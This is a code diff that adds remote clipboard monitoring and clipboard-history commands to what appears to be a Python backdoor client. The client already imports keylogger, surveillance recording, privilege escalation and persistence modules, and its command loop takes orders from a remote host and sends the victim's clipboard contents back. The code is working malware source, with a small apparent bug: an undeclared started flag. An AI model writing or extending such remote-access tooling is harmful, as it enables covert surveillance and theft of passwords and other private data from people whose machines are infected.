@@ -32,7 +32,16 @@ from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
 from features.persistence import create_backdoor_persistence
+from features.clipboard import (
+    start_clipboard_monitor,
+    print_clipboard_history,
+    clipboard_history,
+    PATTERNS
+)
 
+# Add a global variable to hold the clipboard monitor thread and a stop flag
+clipboard_monitor_thread = None
+clipboard_monitor_stop_flag = threading.Event()
 
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
@@ -93,6 +102,7 @@ def download_file(file_name):
 # Main shell function for command execution with enhanced features
 def shell():
     global keylogger, recorder, privilege_escalator, persistence_manager
+    global clipboard_monitor_thread, clipboard_monitor_stop_flag
     
     while True:
         # Receive a command from the remote host
@@ -111,7 +121,55 @@ def shell():
                 reliable_send("Directory changed successfully")
             except Exception as e:
                 reliable_send("Error changing directory: " + str(e))
-                
+
+        # --- CLIPBOARD COMMANDS ---
+        elif command == 'start_clipboard':
+            try:
+                if not clipboard_monitor_started:
+                    # Reset the stop flag before starting
+                    clipboard_monitor_stop_flag.clear()
+                    # Start the monitor using the helper function and store the thread reference
+                    from features.clipboard import clipboard_monitor
+                    clipboard_monitor_thread = threading.Thread(
+                        target=clipboard_monitor,
+                        args=(True, PATTERNS, clipboard_monitor_stop_flag),
+                        daemon=True
+                    )
+                    clipboard_monitor_thread.start()
+                    clipboard_monitor_started = True
+                    reliable_send("Clipboard monitor started")
+                else:
+                    reliable_send("Clipboard monitor already running")
+            except Exception as e:
+                import traceback
+                reliable_send("Clipboard monitor error: " + str(e) + "\n" + traceback.format_exc())
+
+        elif command == 'stop_clipboard':
+            try:
+                if clipboard_monitor_started and clipboard_monitor_thread is not None:
+                    print(f"[DEBUG] Stopping clipboard monitor, thread alive: {clipboard_monitor_thread.is_alive()}")
+                    clipboard_monitor_stop_flag.set()
+                    clipboard_monitor_thread.join(timeout=3)
+                    clipboard_monitor_started = False
+                    clipboard_monitor_thread = None
+                    print("[DEBUG] Clipboard monitor stopped successfully")
+                    reliable_send("Clipboard monitor stopped")
+                else:
+                    reliable_send("Clipboard monitor is not running")
+            except Exception as e:
+                import traceback
+                reliable_send("Stop clipboard monitor error: " + str(e) + "\n" + traceback.format_exc())
+
+        elif command == 'clipboard_history':
+            try:
+                if clipboard_history:
+                    history_str = "\n".join(f"{i+1}: {entry}" for i, entry in enumerate(clipboard_history))
+                    reliable_send("Clipboard History:\n" + history_str)
+                else:
+                    reliable_send("Clipboard history is empty")
+            except Exception as e:
+                reliable_send("Clipboard history error: " + str(e))
+
         # KEYLOGGER COMMANDS
         elif command == 'start_keylog':
             try:
